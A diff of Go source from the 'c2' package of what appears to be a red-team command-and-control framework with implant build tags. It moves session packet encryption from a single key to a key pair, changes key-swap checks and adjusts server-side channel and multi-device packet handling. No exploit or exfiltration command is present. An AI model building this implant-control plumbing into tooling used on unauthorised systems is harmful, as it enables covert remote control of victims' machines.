@@ -1,4 +1,5 @@
 //go:build !implant || !noproxy
+// +build !implant !noproxy
 
 // Copyright (C) 2020 - 2023 iDigitalFlame
 //
@@ -19,7 +20,6 @@
 package c2
 
 import (
-	"errors"
 	"net"
 	"sync/atomic"
 	"time"
@@ -43,7 +43,7 @@ var ErrMalformedPacket = xerr.Sub("empty or nil Packet", 0x46)
 var _ connHost = (*Session)(nil)
 
 type conn struct {
-	key  *data.Key
+	keys data.KeyPair
 	host connHost
 	next *com.Packet
 	subs map[uint32]bool
@@ -52,19 +52,19 @@ type conn struct {
 }
 type connHost interface {
 	chanWake()
-	keyCheck()
-	keyRevert()
 	name() string
 	update(string)
 	chanWakeClear()
 	chanStop() bool
 	stateSet(uint32)
+	keyCheckRevert()
 	chanStart() bool
 	stateUnset(uint32)
 	chanRunning() bool
-	keyValue() *data.Key
 	clientID() device.ID
+	keyCheckSync() error
 	next(bool) *com.Packet
+	keyValue() data.KeyPair
 	deadlineRead() time.Time
 	deadlineWrite() time.Time
 	sender() chan *com.Packet
@@ -75,11 +75,12 @@ type connServer interface {
 	prefix() string
 	clientClear(uint32)
 	wrapper() cfg.Wrapper
+	keyValue() data.KeyPair
 	transform() cfg.Transform
 	clientGet(uint32) (connHost, bool)
 	clientSet(uint32, chan *com.Packet)
 	notify(connHost, *com.Packet) error
-	talk(string, *com.Packet) (*conn, error)
+	talk(string, *com.Packet) (*conn, bool, error)
 	talkSub(string, *com.Packet, bool) (connHost, uint32, *com.Packet, error)
 }
 
@@ -125,11 +126,11 @@ func (s *Session) chanRunning() bool {
 func (s *Session) stateUnset(v uint32) {
 	s.state.Unset(v)
 }
-func (s *Session) keyValue() *data.Key {
-	return &s.key
-}
 func (s *Session) clientID() device.ID {
 	return s.ID
+}
+func (s *Session) keyValue() data.KeyPair {
+	return s.keys
 }
 func (*Session) deadlineWrite() time.Time {
 	return empty
@@ -164,7 +165,15 @@ func (c *conn) stop(h connServer, x net.Conn) {
 	}
 	h.clientUnlock()
 }
-func handle(l *cout.Log, c net.Conn, h connServer, a string) {
+func keyHostSync(h connServer, n *com.Packet) *com.Packet {
+	var (
+		v = &com.Packet{ID: SvComplete, Device: n.Device, Job: n.Job, Flags: com.FlagCrypt}
+		k = h.keyValue()
+	)
+	k.Write(v)
+	return v
+}
+func handle(l cout.Log, c net.Conn, h connServer, a string) {
 	if bugtrack.Enabled {
 		defer bugtrack.Recover("c2.handle()")
 		bugtrack.Track("c2.handle(): a=%s, h=%T, attempting to read a Packet.", a, h)
@@ -192,15 +201,20 @@ func handle(l *cout.Log, c net.Conn, h connServer, a string) {
 		l.Trace(`[%s:%s] %s: Received Packet "%s" (non-channel).`, h.prefix(), n.Device, a, n)
 	}
 	// KeyCrypt: Packet 'n' is decrypted here.
-	v, err := h.talk(a, n)
+	v, e, err := h.talk(a, n)
 	if err != nil {
 		if c.Close(); cout.Enabled {
 			l.Error("[%s:%s] %s: Error processing Packet: %s!", h.prefix(), n.Device, a, err.Error())
 		}
 		return
 	}
-	// KeyCrypt: Crypt next outgoing Packet.
-	v.next.Crypt(v.key)
+	// KeyCrypt: Crypt next outgoing Packet only if the Session is NOT new.
+	if e {
+		v.next.KeyCrypt(v.keys)
+	}
+	// TODO(dij): The server writes the initial Packet here, should we add a JobID
+	//            callback to signal errors? When errors occur, they are usually
+	//            on the "client side" so the server might not see them?
 	if err := writePacket(c, h.wrapper(), h.transform(), v.next); err != nil {
 		if c.Close(); cout.Enabled {
 			l.Error("[%s:%s] %s: Error writing Packet: %s!", h.prefix(), v.next.Device, a, err.Error())
@@ -217,13 +231,14 @@ func handle(l *cout.Log, c net.Conn, h connServer, a string) {
 		v = nil
 		return
 	}
+	v.next.Clear()
 	v.next = nil
 	v.start(l, h, c, a)
 	c.Close()
 	v.close()
 	v = nil
 }
-func (c *conn) start(l *cout.Log, h connServer, x net.Conn, a string) {
+func (c *conn) start(l cout.Log, h connServer, x net.Conn, a string) {
 	h.clientLock()
 	for i := range c.subs {
 		h.clientSet(i, c.host.sender())
@@ -235,7 +250,7 @@ func (c *conn) start(l *cout.Log, h connServer, x net.Conn, a string) {
 	c.channelWrite(l, h, a, x)
 	c.stop(h, x)
 }
-func (c *conn) channelRead(l *cout.Log, h connServer, a string, x net.Conn) {
+func (c *conn) channelRead(l cout.Log, h connServer, a string, x net.Conn) {
 	if bugtrack.Enabled {
 		defer bugtrack.Recover("c2.conn.channelRead()")
 	}
@@ -246,7 +261,7 @@ func (c *conn) channelRead(l *cout.Log, h connServer, a string, x net.Conn) {
 		n, err := readPacket(x, h.wrapper(), h.transform())
 		if err != nil {
 			if cout.Enabled {
-				if errors.Is(err, net.ErrClosed) {
+				if isClosedError(err) {
 					l.Debug("[%s:%s:S->C:R] %s: Read channel socket closed.", h.prefix(), c.host.name(), a)
 				} else {
 					l.Error("[%s:%s:S->C:R] %s: Error reading next wire Packet: %s!", h.prefix(), c.host.name(), a, err.Error())
@@ -255,7 +270,7 @@ func (c *conn) channelRead(l *cout.Log, h connServer, a string, x net.Conn) {
 			break
 		}
 		// KeyCrypt: Decrypt incoming Packet here.
-		if n.Crypt(c.key); cout.Enabled {
+		if n.KeyCrypt(c.keys); cout.Enabled {
 			l.Trace(`[%s:%s:S->C:R] %s: Received a Packet "%s".`, h.prefix(), c.host.name(), a, n)
 		}
 		if err = c.resolve(l, c.host, h, a, n.Tags, true); err != nil {
@@ -288,7 +303,7 @@ func (c *conn) channelRead(l *cout.Log, h connServer, a string, x net.Conn) {
 	}
 	c.stop(h, x)
 }
-func (c *conn) channelWrite(l *cout.Log, h connServer, a string, x net.Conn) {
+func (c *conn) channelWrite(l cout.Log, h connServer, a string, x net.Conn) {
 	if cout.Enabled {
 		l.Debug("[%s:%s:S->C:W] %s: Started Channel writer.", h.prefix(), c.host.name(), a)
 	}
@@ -304,24 +319,23 @@ func (c *conn) channelWrite(l *cout.Log, h connServer, a string, x net.Conn) {
 			n.Flags |= com.FlagChannelEnd
 		}
 		// KeyCrypt: Encrypt outgoing Packet.
-		if n.Crypt(c.key); cout.Enabled {
+		if n.KeyCrypt(c.keys); cout.Enabled {
 			l.Trace(`[%s:%s:S->C:W] %s: Sending Packet "%s".`, h.prefix(), c.host.name(), a, n)
 		}
-		// KeyCrypt: "next" was called, check for a Key Swap.
 		if err := writePacket(x, h.wrapper(), h.transform(), n); err != nil {
 			if n.Clear(); cout.Enabled {
-				if errors.Is(err, net.ErrClosed) {
+				if isClosedError(err) {
 					l.Debug("[%s:%s:S->C:W] %s: Write channel socket closed.", h.prefix(), c.host.name(), a)
 				} else {
 					l.Error("[%s:%s:S->C:W] %s: Error attempting to write Packet: %s!", h.prefix(), c.host.name(), a, err.Error())
 				}
 			}
 			// KeyCrypt: Revert key exchange as send failed.
-			c.host.keyRevert()
+			c.host.keyCheckRevert()
 			break
 		}
 		// KeyCrypt: "next" was called, check for a Key Swap.
-		c.host.keyCheck()
+		c.host.keyCheckSync()
 		if n.Clear(); n.Flags&com.FlagChannelEnd != 0 || c.host.chanStop() {
 			if cout.Enabled {
 				l.Debug("[%s:%s:S->C:W] Session/Packet indicated channel close!", h.prefix(), c.host.name())
@@ -333,7 +347,7 @@ func (c *conn) channelWrite(l *cout.Log, h connServer, a string, x net.Conn) {
 		l.Debug("[%s:%s:S->C:W] Closed Channel writer.", h.prefix(), c.host.name())
 	}
 }
-func (c *conn) process(l *cout.Log, h connServer, a string, n *com.Packet, o bool) error {
+func (c *conn) process(l cout.Log, h connServer, a string, n *com.Packet, o bool) error {
 	if n.Flags&com.FlagMultiDevice != 0 {
 		if err := c.processMultiple(l, h, a, n, o); err != nil {
 			return err
@@ -391,7 +405,7 @@ func (c *conn) process(l *cout.Log, h connServer, a string, n *com.Packet, o boo
 	}
 	return nil
 }
-func (c *conn) processSingle(l *cout.Log, h connServer, a string, n *com.Packet, o bool) error {
+func (c *conn) processSingle(l cout.Log, h connServer, a string, n *com.Packet, o bool) error {
 	if err := h.notify(c.host, n); err != nil {
 		if cout.Enabled {
 			l.Error("[%s:%s] %s: Error processing Packet: %s!", h.prefix(), c.host.name(), a, err.Error())
@@ -406,7 +420,7 @@ func (c *conn) processSingle(l *cout.Log, h connServer, a string, n *com.Packet,
 		c.next = &com.Packet{Flags: com.FlagMulti | com.FlagMultiDevice, Device: c.host.clientID()}
 		if v != nil {
 			// KeyCrypt: Encrypt packet before packing.
-			v.Crypt(c.key)
+			v.KeyCrypt(c.keys)
 			err := writeUnpack(c.next, v, true, true)
 			if v = nil; err != nil {
 				if cout.Enabled {
@@ -414,7 +428,7 @@ func (c *conn) processSingle(l *cout.Log, h connServer, a string, n *com.Packet,
 				}
 			}
 			// KeyCrypt: "next" was called (result was non-nil), check for a Key Swap.
-			c.host.keyCheck()
+			c.host.keyCheckSync()
 			return err
 		}
 		return nil
@@ -422,7 +436,7 @@ func (c *conn) processSingle(l *cout.Log, h connServer, a string, n *com.Packet,
 	c.next = v
 	return nil
 }
-func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packet, o bool) error {
+func (c *conn) processMultiple(l cout.Log, h connServer, a string, n *com.Packet, o bool) error {
 	x := n.Flags.Len()
 	if x == 0 {
 		if n.Clear(); cout.Enabled {
@@ -435,7 +449,7 @@ func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packe
 	}
 	c.next = &com.Packet{Flags: com.FlagMulti | com.FlagMultiDevice, Device: c.host.clientID()}
 	for ; x > 0; x-- {
-		v := new(com.Packet)
+		var v com.Packet
 		if err := v.UnmarshalStream(n); err != nil {
 			n.Clear()
 			if c.next.Clear(); cout.Enabled {
@@ -468,7 +482,7 @@ func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packe
 			if cout.Enabled {
 				l.Debug(`[%s:%s/M] %s: Received an Oneshot Packet "%s".`, h.prefix(), v.Device, a, v)
 			}
-			if err := h.notify(c.host, v); err != nil {
+			if err := h.notify(c.host, &v); err != nil {
 				if cout.Enabled {
 					l.Error("[%s:%s/M] %s: Error processing Oneshot Packet: %s!", h.prefix(), v.Device, a, err.Error())
 				}
@@ -477,8 +491,8 @@ func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packe
 		}
 		if c.host.clientID() == v.Device {
 			// KeyCrypt: Decrypt packet for us here.
-			v.Crypt(c.key)
-			if err := h.notify(c.host, v); err != nil {
+			v.KeyCrypt(c.keys)
+			if err := h.notify(c.host, &v); err != nil {
 				if cout.Enabled {
 					l.Error("[%s:%s/M] %s: Error processing Packet: %s!", h.prefix(), v.Device, a, err.Error())
 				}
@@ -494,7 +508,7 @@ func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packe
 			//           This seems really buggy, but since it happens ONLY on the
 			//           Server/Proxy end, it should be ok. BUG(dij): for marking
 			//           just in case ^_^.
-			z.Crypt(c.key)
+			z.KeyCrypt(c.keys)
 			err := writeUnpack(c.next, z, true, true)
 			if z = nil; err != nil {
 				if c.next.Clear(); cout.Enabled {
@@ -504,7 +518,7 @@ func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packe
 			continue
 		}
 		// KeyCrypt: Packet "r" is already encrypted here.
-		k, q, r, err := h.talkSub(a, v, o)
+		k, q, r, err := h.talkSub(a, &v, o)
 		if err != nil {
 			if c.next.Clear(); cout.Enabled {
 				l.Error("[%s:%s/M] %s: Error reading Session Packet: %s!", h.prefix(), v.Device, a, err.Error())
@@ -526,11 +540,11 @@ func (c *conn) processMultiple(l *cout.Log, h connServer, a string, n *com.Packe
 		}
 	}
 	// KeyCrypt: "next" was called, check for a Key Swap.
-	c.host.keyCheck()
+	c.host.keyCheckSync()
 	n.Clear()
 	return nil
 }
-func (c *conn) resolve(l *cout.Log, s connHost, h connServer, a string, t []uint32, o bool) error {
+func (c *conn) resolve(l cout.Log, s connHost, h connServer, a string, t []uint32, o bool) error {
 	if h.clientLock(); c.subs == nil {
 		c.subs = make(map[uint32]bool, len(t))
 	} else {
@@ -574,12 +588,12 @@ func (c *conn) resolve(l *cout.Log, s connHost, h connServer, a string, t []uint
 		}
 		if n := v.next(true); n != nil {
 			// KeyCrypt: Encrypt this new Packet.
-			n.Crypt(v.keyValue())
+			n.KeyCrypt(v.keyValue())
 			c.add = append(c.add, n)
 			// KeyCrypt: "next" was called, check for a Key Swap.
 			//           This is a tag, which is server side only, so I doubt
 			//           a swap will happen here. BUG(dij): Tag in case also ^_^.
-			v.keyCheck()
+			v.keyCheckSync()
 		}
 	}
 	if !o {
